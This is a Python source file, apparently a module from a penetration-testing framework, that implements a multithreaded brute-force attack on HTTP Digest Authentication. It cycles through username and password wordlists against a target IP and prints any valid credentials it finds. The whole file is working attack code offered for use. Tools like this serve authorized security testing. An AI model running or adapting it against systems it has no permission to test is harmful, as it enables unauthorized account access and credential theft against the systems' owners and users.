import itertools
import threading

from requests.auth import HTTPDigestAuth

import Base.Threads as Threads
import Base.Validators as Validators
import Wordlists
from Base.Exploits import Exploit, Option
from Utils import multi, print_error, print_success, print_status, printTable, http_request


class Exploit(Exploit):
    """
    Module performs bruteforce attack against HTTP Digest Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'credentials/http/digest_bruteforce',
        'display_name': 'HTTP Digest Bruteforce',
        'description': 'Module performs bruteforce attack against HTTP Digest Auth service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',
            'Alexander Yakovlev <https://github.com/toxydose>',
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'references': [
            'https://github.com/dark-lbp/isf',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = Option('192.168.1.1', 'Target IP address or file with target:port (file://)')
    port = Option(80, 'Target port')

    threads = Option(8, 'Numbers of threads')
    usernames = Option('admin', 'Username or file with usernames (file://)')
    passwords = Option(Wordlists.passwords, 'Password or file with passwords (file://)')
    path = Option('/', 'URL Path')
    verbosity = Option(True, 'Display authentication attempts', validators=Validators.boolify)
    stop_on_success = Option(True, 'Stop on first valid authentication attempt', validators=Validators.boolify)

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        url = "{}:{}{}".format(self.target, self.port, self.path)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        if response.status_code != 401:
            print_status("Target is not protected by Digest Auth")
            return

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = itertools.product(usernames, passwords)

        with Threads.ThreadPoolExecutor(self.threads) as executor:
            for record in collection:
                executor.submit(self.target_function, url, record)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            printTable(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, url, creds):
        name = threading.current_thread().name
        user, password = creds
        user = user.encode('utf-8').strip()
        password = password.encode('utf-8').strip()

        response = http_request(method="GET", url=url, auth=HTTPDigestAuth(user, password))

        if response is not None and response.status_code != 401:
            print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target,
                                                                                                            self.port,
                                                                                                            name, user,
                                                                                                            password),
                          verbose=self.verbosity)
            self.credentials.append((self.target, self.port, user, password))
            if self.stop_on_success:
                raise Threads.StopThreadPoolExecutor
        else:
            print_error(
                "Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port,
                                                                                                 name, user, password),
                verbose=self.verbosity)
